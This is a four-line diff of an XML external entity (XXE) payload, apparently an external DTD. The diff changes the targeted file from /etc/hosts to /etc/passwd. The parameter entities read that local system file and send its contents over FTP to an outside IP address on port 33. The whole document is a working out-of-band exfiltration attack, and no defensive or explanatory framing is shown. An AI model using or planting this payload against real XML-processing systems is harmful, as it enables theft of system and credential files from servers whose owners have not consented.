@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/hosts"> 
+<!ENTITY % file SYSTEM "file:///etc/passwd"> 
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://176.122.168.149:33/%file;'>"> 
 %int; 
 %send;
